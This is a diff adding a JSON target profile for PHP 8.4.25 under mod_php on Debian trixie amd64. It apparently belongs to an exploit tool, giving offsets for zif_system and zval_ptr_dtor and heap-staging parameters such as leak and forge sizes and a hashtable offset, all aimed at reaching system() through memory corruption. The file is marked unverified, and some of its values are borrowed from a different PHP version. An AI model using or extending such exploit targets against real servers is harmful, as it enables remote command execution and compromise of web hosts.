@@ -1,0 +1,25 @@
+{
+  "name": "php-8.4.25-trixie-amd64",
+  "php_version": "8.4.25",
+  "os": "debian-trixie",
+  "arch": "amd64",
+  "sapi": "mod_php",
+  "offsets": {
+    "zif_system": "0x465240",
+    "zval_ptr_dtor": "0x65EA30"
+  },
+  "stages": {
+    "a1_big": 78,
+    "a2_parts": 880,
+    "a2_depth": 64,
+    "a2_fillers": 115,
+    "leak_fake_len": "0xC8000",
+    "forge_vl": 384,
+    "forge_n1": 500,
+    "forge_n2": 495,
+    "ht_offset": "0xF8398"
+  },
+  "memory_limit": "128M",
+  "status": "unverified",
+  "notes": "Official php:8.4.25-apache Docker image. Offsets extracted, staging params from 8.4.26."
+}
